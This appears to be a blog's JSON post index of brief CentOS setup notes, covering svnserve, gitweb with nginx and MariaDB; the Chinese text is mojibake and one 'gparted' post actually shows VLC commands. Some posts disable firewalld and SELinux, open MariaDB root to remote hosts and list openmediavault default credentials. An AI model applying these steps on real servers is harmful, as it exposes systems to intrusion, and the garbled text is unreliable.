CGIç•¥","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"Canâ€™t open the log file Read-only file system","slug":"history/tech/5bfd08a795165f292938e0f3","date":"2018-11-26T21:04:39.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bfd08a795165f292938e0f3/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bfd08a795165f292938e0f3/","excerpt":"","text":"æŠ¥é”™ï¼š1Canâ€™t open the log file: Read-only file systemè§£å†³123vim /etc/systemd/system/redis.serviceReadOnlyDirectories=/ReadWriteDirectories=-/usr/local/redis/var","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"install gparted on centos7","slug":"history/tech/5bfcfdc295165f292938e0f2","date":"2018-11-26T20:18:10.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bfcfdc295165f292938e0f2/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bfcfdc295165f292938e0f2/","excerpt":"","text":"123456$&gt; su -#&gt; yum install https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm#&gt; yum install https://download1.rpmfusion.org/free/el/rpmfusion-free-release-7.noarch.rpm#&gt; yum install vlc#&gt; yum install vlc-core (for minimal headless/server install)#&gt; yum install python-vlc npapi-vlc (optionals)https://www.videolan.org/vlc/download-redhat.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"install gparted on centos7","slug":"history/tech/5bfcfda995165f292938e0f1","date":"2018-11-26T20:17:45.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bfcfda995165f292938e0f1/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bfcfda995165f292938e0f1/","excerpt":"","text":"12yum install epel-releaseyum install gparted","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"install git on centos","slug":"history/tech/5bfce0c495165f292938e0f0","date":"2018-11-26T18:14:28.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bfce0c495165f292938e0f0/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bfce0c495165f292938e0f0/","excerpt":"","text":"12345sudo yum install -y openssl-develsudo yum install -y curl-develsudo yum install -y expat-develmake -j4sudo make install","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"install chrome on centos","slug":"history/tech/5bfce05c95165f292938e0ef","date":"2018-11-26T18:12:44.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bfce05c95165f292938e0ef/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bfce05c95165f292938e0ef/","excerpt":"","text":"1234567sudo yum install redhat-lsb-corewget https://dl.google.com/linux/direct/google-chrome-stable_current_x86_64.rpmsudo yum install libXScrnSaversudo yum install libappindicator-gtk3sudo yum install liberation-fontssudo rpm -ivh google-chrome-stable_current_x86_64.rpm","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"install htop on centos","slug":"history/tech/5bfcd55895165f292938e0ee","date":"2018-11-26T17:25:44.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bfcd55895165f292938e0ee/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bfcd55895165f292938e0ee/","excerpt":"","text":"12345678git clone https://github.com/hishamhm/htopcd htopyum groupinstall &quot;Development Tools&quot;yum install ncurses ncurses-devel./autogen.sh./configuremakemake install","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"centos å®‰è£…æ¡Œé¢","slug":"history/tech/5bfbcdda95165f292938e0ea","date":"2018-11-25T22:41:30.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bfbcdda95165f292938e0ea/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bfbcdda95165f292938e0ea/","excerpt":"","text":"123yum groupinstall -y &quot;GNOME Desktop&quot;systemctl set-default graphical.targetreboot","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"mesos èµ„æºè°ƒåº¦","slug":"history/tech/5bfbb28595165f292938e0e9","date":"2018-11-25T20:44:53.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bfbb28595165f292938e0e9/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bfbb28595165f292938e0e9/","excerpt":"","text":"","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"æŒç»­äº¤ä»˜æµæ°´çº¿","slug":"history/tech/5bfbaf7a95165f292938e0e8","date":"2018-11-25T20:31:54.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bfbaf7a95165f292938e0e8/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bfbaf7a95165f292938e0e8/","excerpt":"","text":"","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å®¹é”™é™æµ","slug":"history/tech/5bfbac1f95165f292938e0e7","date":"2018-11-25T20:17:35.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bfbac1f95165f292938e0e7/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bfbac1f95165f292938e0e7/","excerpt":"","text":"","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"è°ƒç”¨é“¾ç›‘æ§","slug":"history/tech/5bfac57c95165f292938e0e6","date":"2018-11-25T03:53:32.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bfac57c95165f292938e0e6/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bfac57c95165f292938e0e6/","excerpt":"","text":"","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"åˆ†å±‚ç›‘æ§","slug":"history/tech/5bfac3f795165f292938e0e5","date":"2018-11-25T03:47:03.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bfac3f795165f292938e0e5/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bfac3f795165f292938e0e5/","excerpt":"","text":"","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"rpc vs rest","slug":"history/tech/5bfab74895165f292938e0e4","date":"2018-11-25T02:52:56.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bfab74895165f292938e0e4/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bfab74895165f292938e0e4/","excerpt":"","text":"","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"centos exfat æŒ‚è½½","slug":"history/tech/5bfa8ff795165f292938e0e3","date":"2018-11-25T00:05:11.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bfa8ff795165f292938e0e3/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bfa8ff795165f292938e0e3/","excerpt":"","text":"12yum install -y http://li.nux.ro/download/nux/dextop/el7/x86_64/nux-dextop-release-0-5.el7.nux.noarch.rpmyum install -y exfat-utils fuse-exfat","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"centos7 æ­å»º svn æœåŠ¡","slug":"history/tech/5bfa7c2395165f292938e0e2","date":"2018-11-24T22:40:35.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bfa7c2395165f292938e0e2/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bfa7c2395165f292938e0e2/","excerpt":"","text":"systemd è„šæœ¬ï¼š12345678910111213141516[Unit]Description=SubversionAfter=syslog.target network.target[Service]Type=forkingExecStart=/usr/bin/svnserve -d -R -r /home/svn/svn --pid-file=/var/run/svnserve.pidExecReload=/bin/kill -HUP $MAINPIDKillMode=control-groupRestart=on-failureUser=rootGroup=rootWorkingDirectory=/home/svn/[Install]WantedBy=multi-user.target æƒé™ï¼š å…³é—­ firewalld12systemctl stop firewalldsystemctl disable firewalld å…³é—­ SELINUXæŸ¥çœ‹ï¼š12getenforcesestatus -vä¸´æ—¶å…³é—­ï¼š1setenforce 0é‡å¯ç”Ÿæ•ˆï¼š12vim /etc/selinux/configSELINUX=disabled","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"centos å®‰è£… giweb","slug":"history/tech/5bfa5d7095165f292938e0e1","date":"2018-11-24T20:29:36.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bfa5d7095165f292938e0e1/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bfa5d7095165f292938e0e1/","excerpt":"","text":"å®‰è£… gitweb ä»£ç 1234$ git clone git://git.kernel.org/pub/scm/git/git.git$ cd git$ make GITWEB_PROJECTROOT=&quot;/opt/git&quot; prefix=/usr gitweb$ sudo cp -Rf gitweb /var/www/gitweb å®‰è£… fastcgi1234yum install -y spawn-fcgi # fastcgiéœ€è¦é€šè¿‡ spawn-fcgi æ¥å¯åŠ¨, ä¹Ÿå¯ä»¥ä¸å®‰è£…yum install -y fcgiyum install -y fcgi-develyum install -y perl-CGI-Session å®‰è£… fcgiwrap12345git clone https://github.com/gnosek/fcgiwrap.gitcd fcgiwrap./configuremakemake install spawn-fcgi é…ç½®æ–‡ä»¶ä½¿ç”¨ root ç”¨æˆ·å°†å¯¼è‡´ fastcgi æ— æ³•å¯åŠ¨123456789101112131415vim /etc/sysconfig/spawn-fcgi# You must set some working options before the &quot;spawn-fcgi&quot; service will work.# If SOCKET points to a file, then this file is cleaned up by the init script.## See spawn-fcgi(1) for all possible options.## Example :#SOCKET=/var/run/php-fcgi.sock#OPTIONS=&quot;-u apache -g apache -s $SOCKET -S -M 0600 -C 32 -F 1 -P /var/run/spawn-fcgi.pid -- /usr/bin/php-cgi&quot;FCGI_SOCKET=/var/run/fcgiwrap.socketFCGI_PROGRAM=/usr/local/sbin/fcgiwrapFCGI_USER=gitFCGI_GROUP=gitFCGI_EXTRA_OPTIONS=&quot;-M 0700&quot;OPTIONS=&quot;-u $FCGI_USER -g $FCGI_GROUP -s $FCGI_SOCKET -S $FCGI_EXTRA_OPTIONS -F 1 -P /var/run/spawn-fcgi.pid -- $FCGI_PROGRAM&quot; é…ç½®å¼€æœºå¯åŠ¨12chkconfig spawn-fcgi on /etc/init.d/spawn-fcgi start ä¿®æ”¹ gitweb é…ç½®æ–‡ä»¶123456789101112vim /etc/gitweb.conf$projectroot = &quot;/home/git/repositories&quot;;@git_base_url_list= (&quot;git://192.168.3.10&quot;, &quot;http://192.168.3.10:5555&quot;);$git_temp = &quot;/home/git/.tmp&quot;;$home_text = &quot;indextext.html&quot;;@stylesheets = (&quot;gitweb.css&quot;);$javascript = &quot;gitweb.js&quot;;@diff_opts = ();$feature&#123;pathinfo&#125;&#123;default&#125; = [1];$feature&#123;&apos;highlight&apos;&#125;&#123;&apos;default&apos;&#125; = [1]; nginx é…ç½®12345678910111213141516171819202122232425262728293031323334353637server &#123; listen 5555; server_name _; index gitweb.cgi; root /var/www/gitweb; location ~ \\.(cgi|pl).*$ &#123; gzip off; fastcgi_pass unix:/var/run/fcgiwrap.socket; fastcgi_param SCRIPT_FILENAME /var/www/gitweb/gitweb.cgi; fastcgi_param SCRIPT_NAME gitweb.cgi; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; &#125; # location ~ ^.*\\.git/objects/([0-9a-f]+/[0-9a-f]+|pack/pack-[0-9a-f]+.(pack|idx))$ &#123; # root /home/git; # &#125; # location ~ ^.*\\.git/(HEAD|info/refs|objects/info/.*|git-(upload|receive)-pack)$ &#123; # root /home/git; # fastcgi_param QUERY_STRING $query_string; # fastcgi_param SCRIPT_FILENAME /usr/libexec/git-core/git-http-backend; # fastcgi_param GIT_HTTP_EXPORT_ALL true; # fastcgi_param GIT_PROJECT_ROOT /home/git/repositories; # fastcgi_param PATH_INFO $uri; # include fastcgi_params; # fastcgi_pass unix:/var/run/fcgiwrap.socket; # &#125; try_files $uri @gitweb; location @gitweb &#123; fastcgi_pass unix:/var/run/fcgiwrap.socket; fastcgi_param SCRIPT_FILENAME /var/www/gitweb/gitweb.cgi; fastcgi_param PATH_INFO $uri; fastcgi_param GITWEB_CONFIG /etc/gitweb.conf; include fastcgi_params; &#125; error_log /var/log/nginx/git.error.log; access_log /var/log/nginx/git.access.log;&#125;gitweb åªæ˜¯git reposçš„æµè§ˆå™¨, å®ƒå¹¶ä¸æä¾›å…‹éš†ï¼Œä½†æ˜¯å¯ä»¥ç”¨ snapshort ä¸‹è½½ä»£ç ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"CentOS 7 å®‰è£… MariaDB","slug":"history/tech/5bf9105395165f292938e0e0","date":"2018-11-23T20:48:19.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bf9105395165f292938e0e0/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bf9105395165f292938e0e0/","excerpt":"","text":"å®‰è£…1234yum install mariadb mariadb-serversystemctl start mariadb systemctl enable mariadb mysql_secure_installation #è®¾ç½®rootå¯†ç ç­‰ç›¸å…³å…è®¸è¿œç¨‹è¿æ¥1234mysql -uroot -puse mysql;update user set host = &apos;%&apos; where user = &apos;root&apos;;flush privileges;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"centos ä¸­æ–‡ä¹±ç è§£å†³","slug":"history/tech/5bf81f4295165f292938e0df","date":"2018-11-23T03:39:46.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bf81f4295165f292938e0df/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bf81f4295165f292938e0df/","excerpt":"","text":"12345678910111213141516171819vim /etc/locale.confLANG=&quot;zh_CN.UTF-8&quot;LANGUAGE=&quot;zh_CN.UTF-8:zh_CN.UTF-8:zh_CN&quot;SUPPORTED=&quot;zh_CN.UTF-8:zh_CN:zh:en_US.UTF-8:en_US:en&quot;SYSFONT=&quot;lat0-sun16&quot;LC_CTYPE=&quot;zh_CN.UTF-8&quot;LC_NUMERIC=&quot;zh_CN.UTF-8&quot;LC_TIME=&quot;zh_CN.UTF-8&quot;LC_COLLATE=&quot;zh_CN.UTF-8&quot;LC_MONETARY=&quot;zh_CN.UTF-8&quot;LC_MESSAGES=&quot;zh_CN.UTF-8&quot;LC_PAPER=&quot;zh_CN.UTF-8&quot;LC_NAME=&quot;zh_CN.UTF-8&quot;LC_ADDRESS=&quot;zh_CN.UTF-8&quot;LC_TELEPHONE=&quot;zh_CN.UTF-8&quot;LC_MEASUREMENT=&quot;zh_CN.UTF-8&quot;LC_IDENTIFICATION=&quot;zh_CN.UTF-8&quot;LC_ALL=zh_CN.UTF-81mount /dev/sdb1 /mnt/test -o iocharset=utf8","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ffmpeg å®‰è£…","slug":"history/tech/5bf80da695165f292938e0de","date":"2018-11-23T02:24:38.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bf80da695165f292938e0de/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bf80da695165f292938e0de/","excerpt":"","text":"ç¼–è¯‘å®‰è£…åæ²¡æœ‰ ffplayï¼Œæ‰€ä»¥éœ€è¦å…ˆç¼–è¯‘å®‰è£… SDLä¸‹è½½ï¼šhttp://www.libsdl.org/download-2.0.phpç¼–è¯‘å®‰è£…ï¼š123./configuremakemake installSDL æ•™ç¨‹ï¼šhttp://kelvmiao.info/sdl-tutorial-cn/ç¼–è¯‘ ffmpeg:","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"centos å®‰è£… pip","slug":"history/tech/5bf7f87895165f292938e0dd","date":"2018-11-23T00:54:16.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bf7f87895165f292938e0dd/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bf7f87895165f292938e0dd/","excerpt":"","text":"12yum -y install epel-releaseyum -y install python-pip","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"centos å®‰è£… sox æ’­æ”¾å™¨","slug":"history/tech/5bf7f3a195165f292938e0dc","date":"2018-11-23T00:33:37.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bf7f3a195165f292938e0dc/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bf7f3a195165f292938e0dc/","excerpt":"","text":"ä»¥ä¸‹æ–¹å¼ä¸å¯è¡Œï¼1yum install gcc-c++ libmad libmad-devel libid3tag libid3tag-devel lame lame-devel flac-devel libvorbis-develä¸‹è½½http://sox.sourceforge.net/123./configuremake make install1sox xxx.mp3","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"centos å®‰è£… ntfs-3g","slug":"history/tech/5bf7ea4695165f292938e0db","date":"2018-11-22T23:53:42.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bf7ea4695165f292938e0db/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bf7ea4695165f292938e0db/","excerpt":"","text":"123cd /etc/yum.repos.d/wget http://mirrors.aliyun.com/repo/epel-7.repoyum -y install ntfs-3g","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"openmediavault é»˜è®¤å¯†ç ","slug":"history/tech/5bf65d8c95165f292938e0da","date":"2018-11-21T19:41:00.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bf65d8c95165f292938e0da/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bf65d8c95165f292938e0da/","excerpt":"","text":"web:12è´¦å·: adminå¯†ç : openmediavaultssh:12è´¦å·: rootå¯†ç : å®‰è£…æ—¶æŒ‡å®š","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"centos7 Minimal ç½‘ç»œé…ç½®","slug":"history/tech/5bf65bb795165f292938e0d9","date":"2018-11-21T19:33:11.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bf65bb795165f292938e0d9/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bf65bb795165f292938e0d9/","excerpt":"","text":"12nmcli dnmtui","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"sqlite ui","slug":"history/tech/5bf4f8e195165f292938e0d8","date":"2018-11-20T18:19:13.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bf4f8e195165f292938e0d8/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bf4f8e195165f292938e0d8/","excerpt":"","text":"https://sqlitestudio.pl/index.rvthttps://sqliteadmin.orbmu2k.de","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"æ ‘è“æ´¾ä¿®æ”¹ vnc åˆ†è¾¨ç‡","slug":"history/tech/5bf4130595165f292938e0d7","date":"2018-11-20T01:58:29.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bf4130595165f292938e0d7/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bf4130595165f292938e0d7/","excerpt":"","text":"12raspi-configAdvanced Options/Resolution","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"struts ognl 